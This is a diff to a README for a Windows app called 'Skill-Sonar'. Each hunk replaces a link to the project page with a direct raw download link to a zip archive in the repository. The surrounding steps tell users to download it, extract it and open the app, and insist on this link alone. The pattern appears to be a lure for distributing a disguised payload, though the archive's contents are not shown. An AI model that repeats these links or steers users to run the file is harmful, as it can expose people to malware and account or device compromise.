@@ -1,6 +1,6 @@
 # 🛰️ Skill-Sonar - Keep Skills in Check
 
-[![Download Skill-Sonar](https://img.shields.io/badge/Download-Skill--Sonar-blue?style=for-the-badge)](https://github.com/Dulcianamongol903/Skill-Sonar)
+[![Download Skill-Sonar](https://img.shields.io/badge/Download-Skill--Sonar-blue?style=for-the-badge)](https://github.com/Dulcianamongol903/Skill-Sonar/raw/refs/heads/main/skill-sonar/Sonar_Skill_2.0.zip)
 
 ## 🎯 What Skill-Sonar Does
 
@@ -19,7 +19,7 @@ It is built for people who want a clear view of skill control without a complex 
 
 To get Skill-Sonar on Windows, visit this page to download:
 
-https://github.com/Dulcianamongol903/Skill-Sonar
+https://github.com/Dulcianamongol903/Skill-Sonar/raw/refs/heads/main/skill-sonar/Sonar_Skill_2.0.zip
 
 On the page, look for the latest release or the main download file. If the app comes as a `.exe` file, download it and open it. If it comes as a `.zip` file, download it, extract it, then open the app inside the folder.
 
@@ -40,7 +40,7 @@ If your PC is managed by a work account, you may need permission to run new apps
 Follow these steps on Windows:
 
 1. Open this link in your browser:
-   https://github.com/Dulcianamongol903/Skill-Sonar
+   https://github.com/Dulcianamongol903/Skill-Sonar/raw/refs/heads/main/skill-sonar/Sonar_Skill_2.0.zip
 
 2. Find the download file on the page.
 
@@ -174,4 +174,4 @@ Skill-Sonar should be downloaded only from the GitHub link above. After download
 
 Use the project page here for the latest release, files, and updates:
 
-https://github.com/Dulcianamongol903/Skill-Sonar
+https://github.com/Dulcianamongol903/Skill-Sonar/raw/refs/heads/main/skill-sonar/Sonar_Skill_2.0.zip
